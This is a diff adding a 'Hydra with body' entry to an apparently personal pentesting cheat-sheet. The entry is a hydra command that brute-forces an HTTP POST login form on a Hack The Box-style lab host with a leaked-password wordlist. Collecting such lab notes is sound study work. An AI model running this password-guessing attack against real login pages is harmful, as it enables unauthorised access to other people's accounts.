@@ -346,3 +346,7 @@ When a folder has execution permission but not read permission, it will not allo
 ### Transform to base 10
 ```$ echo "$((2#0111))"```
 
+### Hydra with body
+```
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt staging-order.mango.htb http-post-form "/:username=^USER^&password=^PASS^&login=login:Log in for ordering" -V
+```
